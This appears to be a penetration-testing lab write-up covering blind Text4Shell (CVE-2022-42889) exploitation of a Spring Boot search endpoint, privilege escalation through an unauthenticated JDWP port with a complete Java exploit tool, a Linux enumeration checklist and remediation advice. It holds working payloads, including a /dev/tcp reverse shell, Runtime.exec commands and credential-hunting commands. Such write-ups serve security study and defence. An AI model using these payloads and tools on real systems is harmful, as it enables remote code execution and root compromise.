2.4 In-band probes

The standard first round on a parameter that ends up in a template or expression language:

for p in '${7*7}' '#{7*7}' '${sys:java.version}' '${env:PATH}' '${date:yyyy-MM-dd}' '{{7*7}}' "a' OR '1'='1"; do

${7*7}                 => {"query":"${7*7}","result":""}
#{7*7}                 => {"query":"#{7*7}","result":""}

A naive reading is "nothing is evaluated — no 49, no 11.0.16, no /usr/local/sbin:...". That reading is wrong, and the mistake it invites is the whole lesson of this box:

The handler prints the parameter it received, not the string it interpolated. The echo proves only that the input was stored and returned unchanged — it says nothing about whether a second, discarded copy of that string was evaluated.

So neither result is informative:

Observation Wrong conclusion Actual meaning
${7*7} echoed as ${7*7} "no expression language" the result of interpolation is not reflected
result always "" "the search returned nothing" result is not derived from the query at all

In-band testing is a dead end here. What we need is a side effect — something the server does that we can observe from outside, without the response carrying it back. That is chapter 03, and it starts from a library name.

2.5 Framework identification

Assembling what the responses have said so far:

Evidence Conclusion
/search/ also matches Spring MVC controller mapping
/error → {"timestamp":...,"status":999,...} Spring Boot BasicErrorController
Content-Type: text/plain;charset=UTF-8 + JSON body handler returns a String/map, not a view
nmap favicon fingerprint Spring Java Framework Spring Boot, embedded Tomcat
no actuator, no Swagger deliberately minimal application

That last row is the one to pull on. In a Java/Spring application, ${prefix:name} is not SpEL — Spring's own expression language uses #{...}. The ${prefix:name} form with a colon is the Apache Commons Text StringSubstitutor lookup syntax: ${sys:java.version}, ${env:PATH}, ${url:UTF-8:http://...}, ${script:javascript:...}.

Versions 1.5–1.9 of Commons Text ship that interpolator with the url, dns and script lookups enabled by default — CVE-2022-42889, "Text4Shell".

The hypothesis is now specific: a Java application that takes query and calls StringSubstitutor.replace(query) on an affected Commons Text version will execute ${script:javascript:...}. To prove it we need to see a side effect. → 03 — Text4Shell

3.1 Background: CVE-2022-42889

Apache Commons Text's StringSubstitutor expands ${prefix:name} expressions. When built with StringSubstitutor.createInterpolator(), the default lookup chain includes:

Lookup What it does Why it matters
script evaluates a JSR-223 script (javascript, groovy, …) arbitrary code in the server JVM
url fetches a URL and returns the body SSRF, and a way to read local files with file:
dns resolves a hostname blind DNS exfiltration
sys, env JVM system properties / environment information disclosure
date, base64*, file* assorted helpers minor

Commons Text 1.5 through 1.9 enable script, url and dns by default. 1.10.0 removed them from the default interpolator. The advisory is CVE-2022-42889, nicknamed Text4Shell after Log4Shell, because the trigger syntax is nearly identical.

The script lookup resolves its engine through javax.script.ScriptEngineManager. On Java 11 the Nashorn JavaScript engine ships with the JDK, so javascript: works out of the box — and Nashorn gives the script full Java interop, which means java.lang.Runtime and java.lang.ProcessBuilder are both reachable.

Chapter 02 established that this application speaks ${prefix:name} and is a Java service. Now we need to see it act.

3.2 Start the callback listener

A bare python3 -m http.server logs the request line but not the headers, and the User-Agent is the single most valuable header here — it identifies the fetching JVM. So use a capture server that records request lines and headers:

On Kali

command
mkdir -p ~/t4s && cd ~/t4s

cat > cap_server.py <<'EOS'
#!/usr/bin/env python3
"""Minimal raw HTTP capture server: logs each request line + headers to a file."""
import datetime
import socketserver
import sys

LOG = "callback_capture.log"


class Handler(socketserver.StreamRequestHandler):
    def handle(self):
        line = self.rfile.readline().decode("latin-1").strip()
        headers = []
        while True:
            h = self.rfile.readline().decode("latin-1").strip()
            if not h:
                break
            headers.append(h)
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG, "a") as fh:
            fh.write(f"[{ts}] {self.client_address[0]}:{self.client_address[1]} {line}\n")
            for h in headers:
                fh.write(f"[{ts}]   {h}\n")
        body = b"ok\n"
        self.wfile.write(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body))
        self.wfile.write(body)


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    with Server(("0.0.0.0", port), Handler) as srv:
        print(f"capture server on {port}", flush=True)
        srv.serve_forever()
EOS

python3 -u cap_server.py 8899
output
capture server on 8899

Leave it running. Everything below arrives in this terminal, not in the curl output.

3.3 Oracle 1 — SSRF proves interpolation

On Kali

command
curl -sS -G --data-urlencode 'query=${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}' \
  "http://192.168.237.150:8080/search"
output
{"query":"${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}","result":""}

The response is, once again, nothing. But the listener terminal shows:

output
[2026-11-15 20:30:34] 192.168.237.150:46830 GET /ssrf-proof HTTP/1.1
[2026-11-15 20:30:34]   User-Agent: Java/11.0.16
[2026-11-15 20:30:34]   Host: 192.168.45.158:8899
[2026-11-15 20:30:34]   Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
[2026-11-15 20:30:34]   Connection: keep-alive

Reading it — this is the finding:

  • The connection comes from 192.168.237.150, the target. The server fetched a URL that we supplied. The ${url:...} lookup ran.
  • User-Agent: Java/11.0.16 — the fetch was made by the JVM, not by a browser or a proxy.
  • The Accept header is the JDK's HttpURLConnection default (text/html, image/gif, image/jpeg, *; q=.2), which nails it to java.net.URL.openConnection().
  • Therefore ${prefix:name} is being interpolated, and the url lookup is enabled — which means this is an affected Commons Text version, and the script lookup is almost certainly in the same default chain.

The interpolated result never reaches us. That is irrelevant: the side effect proved the bug.

3.4 Oracle 2 — timing proves code execution

${script:javascript:...} gives us a JSR-223 engine. The cheapest robust oracle is a sleep — it needs no network, works even if egress is filtered, and produces a signal that cannot be confused with anything else: wall-clock time.

Baseline and payload, measured the same way:

On Kali

command
for p in 'baseline123' '${script:javascript:java.lang.Thread.sleep(4000)}'; do
  S=$(date +%s%N)
  curl -sS -m 30 -G --data-urlencode "query=$p" "http://192.168.237.150:8080/search" > /dev/null
  E=$(date +%s%N)
  echo "payload=$p elapsed_ms=$(( (E-S)/1000000 ))"
done
output
payload=baseline123 elapsed_ms=142
payload=${script:javascript:java.lang.Thread.sleep(4000)} elapsed_ms=4175

Repeating the measurement at three sleep values, same command shape:

output
arg=0      baseline                                    146 ms
arg=1000   Thread.sleep(1000)                         1173 ms
arg=3000   Thread.sleep(3000)                         3208 ms
arg=4000   Thread.sleep(4000)                         4175 ms

Reading it:

  • Baseline 142 ms; the sleep payload 4175 ms. The delta is ~4.03 s for a 4 s sleep — the request thread was blocked by our JavaScript.
  • Subtract the baseline from the series above and you get 1027 ms, 3062 ms and 4029 ms for 1 s, 3 s and 4 s of sleep. The delay is linear in the payload's own argument, which rules out network jitter and slow queries as explanations.
  • java.lang.Thread was reachable from inside the script, which means full Java interop. A sandboxed engine would have thrown on the class reference instead of sleeping.

At this point the box is owned in principle: arbitrary Java in a JVM means Runtime.exec.

One practical note: this oracle blocks a request thread for the whole sleep. Keep sleeps short and do not parallelise them — a handful of 4-second probes is plenty, and hammering the endpoint with 60-second sleeps is a good way to knock the service over.

4.2 Trigger the shell

Two details matter in the payload:

  1. Use ProcessBuilder with separate arguments, not Runtime.exec(String). exec(String) tokenises on whitespace, so bash -c "bash -i >& ..." gets shredded into the wrong argv. The ProcessBuilder(String...) constructor takes each argument explicitly.
  2. All the shell redirection must sit inside the single -c argument — the quotes are part of the Java string, not of a shell command line, because there is no shell yet.

On Kali

command
curl -sS -G --data-urlencode 'query=${script:javascript:new java.lang.ProcessBuilder("/bin/bash","-c","bash -i >& /dev/tcp/192.168.45.158/4445 0>&1").start();}' \
  "http://192.168.237.150:8080/search"
output
{"query":"${script:javascript:new java.lang.ProcessBuilder(\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/192.168.45.158/4445 0>&1\").start();}","result":""}

Still a 200 with an empty result — the handler has no idea anything happened. The listener does:

output

bash: no job control in this shell

The cannot set terminal process group (680) line is a gift: PID 680 is the JVM that spawned us, so the shell is a child of the vulnerable application. That is confirmed directly in 4.3.

4.5 One-shot command execution, without a shell

Sometimes a callback is impossible (no egress, or you only need one command). The same vulnerability executes a single command and blocks until it finishes:

On Kali

command
curl -sS -G --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec("bash -c id>/tmp/out").waitFor();}' \
  "http://192.168.237.150:8080/search"

The command must contain no spaces, because exec(String) splits on them. If you need separators, use ${IFS} — inside the URL-encoded parameter the shell never sees it, but the JVM passes the literal string to bash -c, and bash expands it:

On Kali

command
curl -sS -G --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec("bash -c cat${IFS}/root/proof.txt>/tmp/out").waitFor();}' \
  "http://192.168.237.150:8080/search"

That particular one fails as dev (the file is root-only) — it is here to show the syntax, not the result. .waitFor() keeps the substitution running until the process exits, so a short command leaves the HTTP request hanging for exactly as long as the command takes.

6.1 What JDWP is, and why it is game over

The Java Debug Wire Protocol is how a debugger talks to a JVM. It is enabled at launch:

output
java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y ...

server=y means the JVM listens for a debugger. There is no authentication of any kind — the protocol begins with the seven-byte ASCII handshake JDWP-Handshake and, once that is echoed, the client may issue any command in the protocol, including:

  • VirtualMachine.CreateString — allocate objects in the target heap
  • ClassType.InvokeMethod / ObjectReference.InvokeMethod — call any method, on any object
  • VirtualMachine.Suspend/Resume, ThreadReference.* — stop and inspect everything

Runtime.getRuntime().exec(...) is a method. There is no sandbox, no allow-list, no signature. A JDWP port is unauthenticated remote code execution waiting for a TCP connection — here restricted to loopback, which is exactly what a shell as dev provides.

The obstacle is not permission. It is that invocation has strict preconditions, and the error you get when you get them wrong is a bare INVALID_THREAD (JDWP error 10) with no explanation.

6.5 The rule: only event-suspended threads are invokable

The JDWP specification says a thread may be used for InvokeMethod only if it is suspended by an event — a breakpoint, a step, an exception — and, unless you pass INVOKE_SINGLE_THREADED, all other threads must be running. VirtualMachine.Suspend does not produce an event-suspended thread. Neither does ThreadReference.Suspend.

That single sentence explains attempts 2 and 3: the thread was stopped, but not at an event.

So the plan becomes: get the thread to stop at a breakpoint, which is an event, then invoke while the rest of the VM runs normally.

6.6 Attempt 4 — breakpoints that never fire

It never fires because since Java 9, string concatenation compiles to invokedynamic + StringConcatFactory, not to StringBuilder.append. The application does plenty of string work; none of it calls that method.

[*] attached to OpenJDK 64-Bit Server VM 11.0.16

A method-entry breakpoint fires when the thread enters the method. The main thread was already parked inside accept() — waiting on a socket, entered long before we attached. It would only break the next time round the loop, and it had no reason to go round: nobody was connecting to port 5000.

That is the second half of the trick: make the target execute the code path yourself. The statistics service answers on port 5000, so a single TCP connection from the debugger process makes accept() return, main continue, and the loop execute real Java code — at which point a breakpoint on any method called in that path (String.getBytes is called on the response) fires.

6.7 Attempt 5 — breakpoint on String.getBytes, plus a poke

The final tool does five things:

  1. Attach with JDI, clear the startup suspend counts (suspend=y JVMs begin suspended; vm.resume() must be called until the count is zero or nothing runs).
  2. Set a breakpoint on java.lang.String.getBytes with SUSPEND_EVENT_THREAD — only the event thread stops, the VM keeps running.
  3. Start a thread that connects to 127.0.0.1:5000 after one second and writes a byte. This is the poke: it unblocks accept() and drives main into the code that serialises the response.
  4. Wait for a BreakpointEvent whose thread is named main (other threads also call getBytes — the JDK's own I/O threads, for instance), then disable the breakpoint so the pending invocation does not trip over it again.
  5. On that breakpoint-suspended thread, invoke Runtime.getRuntime() and then Runtime.exec(command).

import com.sun.jdi.Bootstrap;
import com.sun.jdi.ClassType;
import com.sun.jdi.Method;
import com.sun.jdi.ObjectReference;
import com.sun.jdi.ReferenceType;
import com.sun.jdi.StringReference;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.Value;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.event.BreakpointEvent;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.request.BreakpointRequest;
import com.sun.jdi.request.EventRequest;
import com.sun.jdi.connect.AttachingConnector;
import com.sun.jdi.connect.Connector;

import java.util.Collections;
import java.util.Map;

public class JdiBreakExec {
    public static void main(String[] args) throws Exception {
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String command = args[2];
        String breakClass = args.length > 3 ? args[3] : "java.lang.String";
        String breakMethod = args.length > 4 ? args[4] : "getBytes";
        String breakSig = args.length > 5 ? args[5] : "()[B";

        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors()) {
            if ("com.sun.jdi.SocketAttach".equals(c.name())) {
                conn = c;
            }
        }
        Map<String, Connector.Argument> cargs = conn.defaultArguments();
        cargs.get("hostname").setValue(host);
        cargs.get("port").setValue(String.valueOf(port));
        VirtualMachine vm = conn.attach(cargs);
        System.out.println("[*] attached to " + vm.name() + " " + vm.version());

        ReferenceType target = null;
        for (ReferenceType rt : vm.classesByName(breakClass)) {
            target = rt;
        }
        if (target == null) {
            throw new IllegalStateException("breakpoint class not loaded: " + breakClass);
        }
        Method bm = null;
        for (Method m : target.methodsByName(breakMethod, breakSig)) {
            bm = m;
        }
        if (bm == null) {
            throw new IllegalStateException("breakpoint method not found");
        }
        BreakpointRequest bp = vm.eventRequestManager().createBreakpointRequest(bm.location());
        bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
        bp.enable();
        System.out.println("[*] breakpoint set at " + breakClass + "." + breakMethod);

        // Clear the attach-time and startup suspend counts (suspend=y JVMs).
        for (int i = 0; i < 3; i++) {
            try {
                vm.resume();
            } catch (Exception ignored) {
            }
        }
        // Unblock the target's accept() so the post-accept code path runs.
        new Thread(new Runnable() {
            public void run() {
                try {
                    Thread.sleep(1000);
                    java.net.Socket s = new java.net.Socket("127.0.0.1", 5000);
                    s.getOutputStream().write('x');
                    s.getOutputStream().flush();
                    Thread.sleep(3000);
                    s.close();
                } catch (Exception ignored) {
                }
            }
        }).start();

        ThreadReference thread = null;
        EventSet hit = null;
        long deadline = System.currentTimeMillis() + 30000;
        while (thread == null && System.currentTimeMillis() < deadline) {
            EventSet es = vm.eventQueue().remove(2000);
            if (es == null) {
                continue;
            }
            for (Event ev : es) {
                if (ev instanceof BreakpointEvent) {
                    ThreadReference t = ((BreakpointEvent) ev).thread();
                    if ("main".equals(t.name())) {
                        thread = t;
                        hit = es;
                        break;
                    }
                }
            }
            if (thread == null) {
                es.resume();
            }
        }
        if (thread == null) {
            throw new IllegalStateException("no breakpoint event received");
        }
        System.out.println("[*] breakpoint hit on thread: " + thread.name()
                + " frames=" + thread.frameCount());
        bp.disable();  // avoid re-triggering during the pending invocation

        ReferenceType rt = vm.classesByName("java.lang.Runtime").get(0);
        Method getRuntime = null;
        Method exec = null;
        for (Method m : rt.methodsByName("getRuntime")) {
            if (m.signature().equals("()Ljava/lang/Runtime;")) {
                getRuntime = m;
            }
        }
        for (Method m : rt.methodsByName("exec")) {
            if (m.signature().equals("(Ljava/lang/String;)Ljava/lang/Process;")) {
                exec = m;
            }
        }

        ObjectReference rtObj = (ObjectReference) ((ClassType) rt).invokeMethod(
                thread, getRuntime, Collections.<Value>emptyList(), 0);
        System.out.println("[*] Runtime instance = " + rtObj);

        StringReference cmdRef = vm.mirrorOf(command);
        ObjectReference proc = (ObjectReference) rtObj.invokeMethod(
                thread, exec, Collections.<Value>singletonList(cmdRef), 0);
        System.out.println("[+] exec returned " + proc);

        hit.resume();
        Thread.sleep(500);
        try {
            vm.resume();
        } catch (Exception ignored) {
        }
        vm.dispose();
    }
}

7.3 Lessons

1. A blind injection needs a side effect, not a reflection. {"query":"…","result":""} was identical for every payload. Six classic in-band probes returned nothing. The bug was found by making the server do something (fetch a URL) and take time (sleep). When the response is a fixed shape, stop looking at the response.

2. An echo is not an evaluation. The endpoint prints the parameter it received, not the string it interpolated. Those are two different strings, and the one that mattered was the one that never came back. "My payload appears verbatim in the response" proves nothing about whether it was also handed to a template engine.

3. Version defaults are the vulnerability. commons-text-1.8 is not "outdated" in the usual sense — it is a released, correct library whose default interpolator includes script, url and dns. Nothing was misconfigured in code; the mistake was using a default that is dangerous when the input is untrusted. The CHANGELOG in /opt/dev says it was added for "String Interpolation", which is exactly what made it exploitable.

4. JDWP invocation has a precondition nobody states. isSuspended() == true, frameCount() == 9, and INVALID_THREAD anyway. The thread must be suspended by an event. This is the difference between jdb, a hand-written protocol client and VirtualMachine.Suspend all failing and a breakpoint succeeding.

5. Breakpoints only fire on entry. ServerSocket.accept was the perfect breakpoint and never fired, because the thread was already inside it. Driving the code path — one TCP connection to port 5000 — is part of the exploit, not a workaround.

6. Compile for the runtime, not the compiler. javac 18.0.2-ea on a java 11.0.16 target produces class file 62 against a maximum of 55. The error is explicit (UnsupportedClassVersionError), but only if you actually read it; --release 11 is the fix. Check javac -version and java -version on any Java target before building anything.

7. Loopback services belong in the enumeration. nmap from outside saw 22, 5000 and 8080. ss -ltnp from inside added 127.0.0.1:8000 — the only thing on the host that turns a user shell into root. Every post-foothold checklist should include a listener sweep, and every loopback listener should be explained before it is dismissed.

7.4 Remediation

Issue Fix
CVE-2022-42889 Upgrade Commons Text to 1.10.0+, or build the sub­stitutor with an explicit lookup allow-list and no script/url/dns
Untrusted input interpolated Never pass request parameters to StringSubstitutor.replace(); validate and reject ${…} on search input
JDWP exposed Remove -Xdebug -Xrunjdwp:… from production launch flags
Debug agent running as root If remote debugging is genuinely required: bind to a management interface behind a firewall, keep suspend=n, never run it as root
Root service with a debug port Run the stats service as an unprivileged user, so a debug agent (or any RCE in it) is not an instant root

The deeper point: either of these alone is a finding, but the pair is a full compromise. A vulnerable library got an unprivileged shell; a debug flag on a root process turned it into root. Neither was a "misconfiguration" in the sense of a setting someone changed — both were defaults someone accepted.

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Step Command Rule

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.
